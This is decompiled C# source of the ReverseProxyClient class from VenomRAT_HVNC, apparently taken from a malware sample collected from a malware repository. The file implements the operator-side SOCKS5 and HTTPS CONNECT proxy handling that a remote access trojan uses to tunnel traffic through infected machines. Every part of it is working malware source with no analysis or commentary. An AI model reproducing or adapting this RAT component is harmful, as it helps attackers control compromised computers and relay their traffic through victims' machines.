// Decompiled with JetBrains decompiler
// Type: VenomRAT_HVNC.Server.Helper.ReverseProxyClient
// Assembly: VenomRAT_HVNC, Version=5.0.4.0, Culture=neutral, PublicKeyToken=null
// MVID: 364FC72B-4DB8-403E-BB7F-732199A12380
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.04\HEUR-HackTool.MSIL.Alien.gen-666d190a7059c03b3572dd66e51b8232537a8650bbdcbfbe3f8335c830f3aeae.exe

using System;
using System.IO;
using System.Net.Sockets;
using System.Text;
using VenomRAT_HVNC.Server.Connection;

namespace VenomRAT_HVNC.Server.Helper
{
  public class ReverseProxyClient
  {
    public const int SOCKS5_DEFAULT_PORT = 3218;
    public const byte SOCKS5_VERSION_NUMBER = 5;
    public const byte SOCKS5_RESERVED = 0;
    public const byte SOCKS5_AUTH_NUMBER_OF_AUTH_METHODS_SUPPORTED = 2;
    public const byte SOCKS5_AUTH_METHOD_NO_AUTHENTICATION_REQUIRED = 0;
    public const byte SOCKS5_AUTH_METHOD_GSSAPI = 1;
    public const byte SOCKS5_AUTH_METHOD_USERNAME_PASSWORD = 2;
    public const byte SOCKS5_AUTH_METHOD_IANA_ASSIGNED_RANGE_BEGIN = 3;
    public const byte SOCKS5_AUTH_METHOD_IANA_ASSIGNED_RANGE_END = 127;
    public const byte SOCKS5_AUTH_METHOD_RESERVED_RANGE_BEGIN = 128;
    public const byte SOCKS5_AUTH_METHOD_RESERVED_RANGE_END = 254;
    public const byte SOCKS5_AUTH_METHOD_REPLY_NO_ACCEPTABLE_METHODS = 255;
    public const byte SOCKS5_CMD_REPLY_SUCCEEDED = 0;
    public const byte SOCKS5_CMD_REPLY_GENERAL_SOCKS_SERVER_FAILURE = 1;
    public const byte SOCKS5_CMD_REPLY_CONNECTION_NOT_ALLOWED_BY_RULESET = 2;
    public const byte SOCKS5_CMD_REPLY_NETWORK_UNREACHABLE = 3;
    public const byte SOCKS5_CMD_REPLY_HOST_UNREACHABLE = 4;
    public const byte SOCKS5_CMD_REPLY_CONNECTION_REFUSED = 5;
    public const byte SOCKS5_CMD_REPLY_TTL_EXPIRED = 6;
    public const byte SOCKS5_CMD_REPLY_COMMAND_NOT_SUPPORTED = 7;
    public const byte SOCKS5_CMD_REPLY_ADDRESS_TYPE_NOT_SUPPORTED = 8;
    public const byte SOCKS5_ADDRTYPE_IPV4 = 1;
    public const byte SOCKS5_ADDRTYPE_DOMAIN_NAME = 3;
    public const byte SOCKS5_ADDRTYPE_IPV6 = 4;
    public const int BUFFER_SIZE = 8192;
    private bool _receivedConnResponse;
    private MemoryStream _handshakeStream;
    private byte[] _buffer;
    private bool _isBindCommand;
    private bool _isUdpCommand;
    private bool _isConnectCommand;
    private bool _isIpType;
    private bool _isIPv6NameType;
    private bool _isDomainNameType;
    private bool _disconnectIsSend;
    private ReverseProxyServer Server;

    public Socket Handle { get; private set; }

    public Clients Client { get; private set; }

    public long PacketsReceived { get; private set; }

    public long PacketsSended { get; private set; }

    public long LengthReceived { get; private set; }

    public long LengthSent { get; private set; }

    public int ConnectionId => this.Handle.Handle.ToInt32();

    public string TargetServer { get; private set; }

    public ushort TargetPort { get; private set; }

    public bool IsConnected { get; private set; }

    public ReverseProxyClient.ProxyType Type { get; private set; }

    public string HostName { get; private set; }

    public bool ProxySuccessful { get; private set; }

    public ReverseProxyClient(Clients client, Socket socket, ReverseProxyServer server)
    {
      this.Handle = socket;
      this.Client = client;
      this._handshakeStream = new MemoryStream();
      this._buffer = new byte[8192];
      this.IsConnected = true;
      this.TargetServer = "";
      this.Type = ReverseProxyClient.ProxyType.Unknown;
      this.Server = server;
      try
      {
        socket.BeginReceive(this._buffer, 0, this._buffer.Length, SocketFlags.None, new AsyncCallback(this.AsyncReceive), (object) null);
      }
      catch
      {
        this.Disconnect();
      }
    }

    private void AsyncReceive(IAsyncResult ar)
    {
      try
      {
        int count = this.Handle.EndReceive(ar);
        if (count <= 0)
        {
          this.Disconnect();
          return;
        }
        if (count > 5000 || this._handshakeStream.Length + (long) count > 5000L)
        {
          this.Disconnect();
          return;
        }
        this.LengthReceived += (long) count;
        this._handshakeStream.Write(this._buffer, 0, count);
      }
      catch
      {
        this.Disconnect();
        return;
      }
      byte[] array = this._handshakeStream.ToArray();
      long packetsReceived = this.PacketsReceived;
      if (packetsReceived != 0L)
      {
        if (packetsReceived == 1L)
        {
          int num = 6;
          if (array.Length >= num)
          {
            if (!this.CheckProxyVersion(array))
              return;
            this._isConnectCommand = array[1] == (byte) 1;
            this._isBindCommand = array[1] == (byte) 2;
            this._isUdpCommand = array[1] == (byte) 3;
            this._isIpType = array[3] == (byte) 1;
            this._isDomainNameType = array[3] == (byte) 3;
            this._isIPv6NameType = array[3] == (byte) 4;
            Array.Reverse((Array) array, array.Length - 2, 2);
            this.TargetPort = BitConverter.ToUInt16(array, array.Length - 2);
            if (this._isConnectCommand)
            {
              if (this._isIpType)
                this.TargetServer = array[4].ToString() + "." + array[5].ToString() + "." + array[6].ToString() + "." + array[7].ToString();
              else if (this._isDomainNameType)
              {
                int count = (int) array[4];
                if (num + count < array.Length)
                  this.TargetServer = Encoding.ASCII.GetString(array, 5, count);
              }
              if (this.TargetServer.Length <= 0)
                ;
              this.Server.CallonUpdateConnection(this);
              return;
            }
            this.SendFailToClient();
            return;
          }
        }
      }
      else if (array.Length >= 3)
      {
        string str1 = Encoding.ASCII.GetString(array);
        if (array[0] == (byte) 5)
          this.Type = ReverseProxyClient.ProxyType.SOCKS5;
        else if (str1.StartsWith("CONNECT") && str1.Contains(":"))
        {
          this.Type = ReverseProxyClient.ProxyType.HTTPS;
          using (StreamReader streamReader = new StreamReader((Stream) new MemoryStream(array)))
          {
            string str2 = streamReader.ReadLine();
            if (str2 != null)
            {
              string[] strArray = str2.Split(new string[1]
              {
                " "
              }, StringSplitOptions.RemoveEmptyEntries);
              if (strArray.Length != 0)
              {
                try
                {
                  string str3 = strArray[1];
                  this.TargetServer = str3.Split(':')[0];
                  this.TargetPort = ushort.Parse(str3.Split(':')[1]);
                  this._isConnectCommand = true;
                  this._isDomainNameType = true;
                  this.Server.CallonConnectionEstablished(this);
                  return;
                }
                catch
                {
                  this.Disconnect();
                }
              }
            }
            else
              goto label_37;
          }
        }
        else
          goto label_37;
        if (this.CheckProxyVersion(array))
        {
          this.SendSuccessToClient();
          ++this.PacketsReceived;
          this._handshakeStream.SetLength(0L);
          this.Server.CallonConnectionEstablished(this);
        }
      }
label_37:
      try
      {
        this.Handle.BeginReceive(this._buffer, 0, this._buffer.Length, SocketFlags.None, new AsyncCallback(this.AsyncReceive), (object) null);
      }
      catch
      {
        this.Disconnect();
      }
    }

    public void Disconnect()
    {
      if (!this._disconnectIsSend)
        this._disconnectIsSend = true;
      try
      {
        this.Handle.Close();
      }
      catch
      {
      }
      this.IsConnected = false;
      this.Server.CallonUpdateConnection(this);
    }

    public void SendToClient(byte[] payload)
    {
      lock (this.Handle)
      {
        try
        {
          this.LengthSent += (long) payload.Length;
          this.Handle.Send(payload);
        }
        catch
        {
          this.Disconnect();
        }
      }
      this.Server.CallonUpdateConnection(this);
    }

    private void SendFailToClient()
    {
      if (this.Type == ReverseProxyClient.ProxyType.HTTPS)
        this.Disconnect();
      if (this.Type != ReverseProxyClient.ProxyType.SOCKS5)
        return;
      this.SendToClient(new byte[2]
      {
        (byte) 5,
        byte.MaxValue
      });
      this.Disconnect();
    }

    private void SendSuccessToClient()
    {
      if (this.Type != ReverseProxyClient.ProxyType.SOCKS5)
        return;
      this.SendToClient(new byte[2]{ (byte) 5, (byte) 0 });
    }

    private bool CheckProxyVersion(byte[] payload)
    {
      if (this.Type == ReverseProxyClient.ProxyType.HTTPS || payload.Length == 0 || payload[0] == (byte) 5)
        return true;
      this.SendFailToClient();
      this.Disconnect();
      return false;
    }

    private void AsyncReceiveProxy(IAsyncResult ar)
    {
      try
      {
        int length = this.Handle.EndReceive(ar);
        if (length <= 0)
        {
          this.Disconnect();
          return;
        }
        this.LengthReceived += (long) length;
        byte[] destinationArray = new byte[length];
        Array.Copy((Array) this._buffer, (Array) destinationArray, length);
        this.LengthSent += (long) destinationArray.Length;
        ++this.PacketsSended;
      }
      catch
      {
        this.Disconnect();
        return;
      }
      ++this.PacketsReceived;
      this.Server.CallonUpdateConnection(this);
      try
      {
        this.Handle.BeginReceive(this._buffer, 0, this._buffer.Length, SocketFlags.None, new AsyncCallback(this.AsyncReceiveProxy), (object) null);
      }
      catch
      {
      }
    }

    public enum ProxyType
    {
      Unknown,
      SOCKS5,
      HTTPS,
    }
  }
}
